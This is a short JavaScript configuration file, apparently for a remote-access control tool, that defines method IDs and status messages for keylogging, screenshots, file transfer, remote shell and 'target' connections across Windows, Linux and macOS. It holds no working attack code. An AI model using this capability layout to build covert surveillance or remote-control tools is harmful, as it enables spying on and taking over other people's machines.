/*
 * @Auther: MercyLin
 * @Description: config file
 * @Date: 2020-09-10 12:24:36
 * @LastEditors: MercyLin
 * @LastEditTime: 2020-09-11 17:23:26
 * @FilePath: \seeds\src\main\config.js
 */
/**
 * Config file
 */
export default {
  connection: {
    ALIVE_PERIOD: 10000,
    MAX_RETRY_TIMES: 3,
    MAX_SEQUENCE_NUMBER: 65536,
    RESPONSE_TIMEOUT: 30000
  },
  methodID: {
    disconnect: 1,
    keyLogger: 2,
    screenShot: 3,
    transFile: 4,
    getFilePreview: 5,
    shell: 7,
    sendCommand: 6
  },
  statusCodes: {
    '201': 'Shell connected',
    '202': 'Transmission success',
    '203': 'keyLogger updated',
    '300': 'file dose not exist',
    '401': 'target disconnect',
    '402': 'shell disconnect'
  },
  systemKind: {
    1: 'Windows',
    2: 'Linuix',
    3: 'MaxOs'
  }
}
